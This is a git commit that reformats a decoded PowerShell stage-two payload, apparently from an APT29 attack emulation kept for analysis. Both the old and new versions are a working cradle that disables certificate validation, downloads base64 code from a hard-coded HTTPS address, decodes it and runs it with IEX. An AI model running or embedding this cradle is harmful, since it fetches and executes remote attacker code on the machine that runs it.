7aacc6863c9c9ad02ce32f18c03f6d97118eb7e2
Marshall Corkery <231997446+MarshallSecOps@users.noreply.github.com>
2025-12-11 11:53:22 +1100

    Update 02_apt29_day2_https_stage2_payload.ps1

--- decoded_payloads/02_apt29_day2_https_stage2_payload.ps1
+++ decoded_payloads/02_apt29_day2_https_stage2_payload.ps1
@@ -1,1 +1,7 @@
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('https://192.168.0.4:443/GoPro5/black/2018/_rp')));IEX $MS
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+$MS = [System.Text.Encoding]::UTF8.GetString(
+    [System.Convert]::FromBase64String(
+        (New-Object System.Net.WebClient).DownloadString('https://192.168.0.4:443/GoPro5/black/2018/_rp')
+ )
+);
+IEX $MS
